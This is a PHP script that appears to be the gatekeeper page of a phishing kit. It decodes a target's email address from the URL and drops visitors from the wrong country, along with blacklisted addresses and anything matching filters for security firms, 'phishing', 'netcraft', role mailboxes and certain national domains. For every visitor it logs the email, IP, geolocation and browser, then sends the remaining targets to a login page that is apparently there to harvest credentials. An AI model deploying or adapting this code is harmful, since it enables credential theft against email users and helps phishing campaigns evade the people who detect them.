<?php
ini_set("display_errors", 1);
error_reporting(E_ALL);

#ini_set('display_errors',0);
#error_reporting(0);

include('xset.php');

$id=base64_decode($_GET['id']);
$id=trim($id);



if(strpos($id,'@')===false){
        header("Location:http://www.google.com");
        //include($file404); //die('header is not working @');
        die();
}
if($country !== $country_check) {
        $fp=fopen($save,"a+");
        
$msg='|'.trim($id).'|'.$country.'|'.$region.'|'.$state.'|'.$city.'|'.$lat.'|'.$lon.'|'.$continent.'|'.$ip.'|NOO'.chr(10);
        fputs($fp,$msg);
        fclose($fp);
        include($file404);
        //header('location:http://google.com'); //die('country doesnt mactches');
        die();
}

$bad_mails=file($bad);
$skip_bad=0;

foreach($bad_mails as $badmails) {
        $badmails=trim($badmails);
        $id=trim($id);

        if(stripos($badmails,$id)!==false)
                $skip_bad=1; //die($badmails.'<<<---- is in the list');
}

if($skip_bad==1) {
        $fp=fopen($save,"a+");
        $msg= trim($id). 
'|blacklisted|'.$country.'|'.$region.'|'.$state.'|'.$city.'|'.$lat.'|'.$lon.'|'.$continent.'|'.$ip.'|NOO'.chr(10);
        fputs($fp,$msg);
        fclose($fp);
        include($file404);
        // header('location:http://google.com'); // die('mail is in list');
        die();
}

/*
data
*/

if( preg_match('/.*@pummarola\.org/i',$id))                                   $skip_bad=1;
if( preg_match('/.*@microsoft\.com/i',$id))                                   $skip_bad=1;
if( preg_match('/.*@qq\.com/i',$id))                                   $skip_bad=1;
if( preg_match('/.*@nectolab\.com/i',$id))                                   $skip_bad=1;
if( preg_match('/.*\.hr$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*@wanadoo\.fr/i',$id))                                   $skip_bad=1;
if( preg_match('/.*\.cnr\.it/i',$id))                                   $skip_bad=1;
if( preg_match('/.*\.nc$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*\.be$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*\.de$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*\.ro$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*\.fr$/i',$id))                                              $skip_bad=1;
if( preg_match('/.*\.ru$/i',$id))                                                $skip_bad=1;
if( preg_match('/.*\.rs$/i',$id))                                                $skip_bad=1;
if( preg_match('/.*\.it$/i',$id))                                                $skip_bad=1;
if( preg_match('/.*\.mi\.it/i',$id))                                    $skip_bad=1;
//if( preg_match('/.*@istruzione\.it/i',$id))                             $skip_bad=1;
if( preg_match('/.*@pec\.istruzione\.it/i',$id))                             $skip_bad=1;
if( preg_match('/.*@orange.*/i',$id))                                   $skip_bad=1;
if( preg_match('/.*@inps\.it/i',$id))                                   $skip_bad=1;
if( preg_match('/.*@hotel.*/i',$id))                                    $skip_bad=1;
if( preg_match('/.*marketing.*/i',$id))                                 $skip_bad=1;
if( preg_match('/.*segreteria.*/i',$id))                                $skip_bad=1;
if( preg_match('/.*phishing.*/i',$id))                                  $skip_bad=1;
if( preg_match('/.*netcraft.*/i',$id))                                  $skip_bad=1;
if( preg_match('/assistenza.*/i',$id))                                  $skip_bad=1;
if( preg_match('/accounting@.*/i',$id))                                 $skip_bad=1;
if( preg_match('/reservation.*/i',$id))                                 $skip_bad=1;
if( preg_match('/presidente@.*/i',$id))                                 $skip_bad=1;
if( preg_match('/mail@.*/i',$id))                                     $skip_bad=1;
if( preg_match('/sales@.*/i',$id))                                      $skip_bad=1;
if( preg_match('/redazione@.*/i',$id))                                 $skip_bad=1;
if( preg_match('/support@.*/i',$id))                                  $skip_bad=1;
if( preg_match('/tecnico@.*/i',$id))                                     $skip_bad=1;
if( preg_match('/direzione@.*/i',$id))                                  $skip_bad=1;
if( preg_match('/ordini@.*/i',$id))                                   $skip_bad=1;
if( preg_match('/commerciale@.*/i',$id))                                $skip_bad=1;
if( preg_match('/contact@.*/i',$id))                                    $skip_bad=1;
if( preg_match('/info@.*/i',$id))                                       $skip_bad=1;
if( preg_match('/office@.*/i',$id))                                     $skip_bad=1;
if( preg_match('/amministra.*/i',$id))                                  $skip_bad=1;
if( preg_match('/admin.*/i',$id))                                       $skip_bad=1;

/*
end data
*/

if($skip_bad==1){
        /* save wrong one as statistics */
        $fp=fopen($save,"a+");
        $msg= 
trim($id).'|suspicious|'.$country.'|'.$region.'|'.$state.'|'.$city.'|'.$lat.'|'.$lon.'|'.$continent.'|'.$ip.'|NOO'.chr(10);
        fputs($fp,$msg);
        fclose($fp);
        include($file404);
        // header('location:http://google.com'); die('email is is blacklist');
        die();
}

$check='unknown';

if(detect_mobile())  {
         $check='MOB';

}else{
        $check='CMP';
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'].'|'.$ua['version'].'|'.$ua['platform']; /*. " reports: <br >" . $ua['userAgent']; */

$isAndroid = (stripos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false);
$android0='';
if(!$isAndroid) $android0='nullandr'; else $android0='android';



#$width=$_GET['w'];


$fp=fopen($save,"a+");
$msg= '|'.trim($id). 
'|'.$ip.'|'.$check.'|'.$yourbrowser.'|'.$android0.'|'.$country.'|'.$region.'|'.$state.'|'.$city.'|'.$lat.'|'.$lon.'|'.$continent.'|'.chr(10);
fputs($fp,$msg);
fclose($fp);




if(detect_mobile()) {
        $pwd=getcwd();
        $statsmob=$pwd.'/logs/visitmob';
        $file=file($statsmob);
                foreach ($file as $files )
                {
                        list($cmp,$nr)=explode(':',$files);
                        $out=$nr+1;
                        $snd='mob:'.$out.chr(10);
                        $fpt=fopen($statsmob,'w+');
                        fputs($fpt,$snd);
                        fclose($fpt);
                }
        header('location:'.$login_page);


} else {
        $pwd=getcwd();
        $statsmob=$pwd.'/logs/visitcmp';
        $file=file($statsmob);
                foreach ($file as $files )
                {
                        list($cmp,$nr)=explode(':',$files);
                        $out=$nr+1;
                        $snd='cpu:'.$out.chr(10);
                        $fpt=fopen($statsmob,'w+');
                        fputs($fpt,$snd);
                        fclose($fpt);
                }
        header('location:'.$login_page);

}
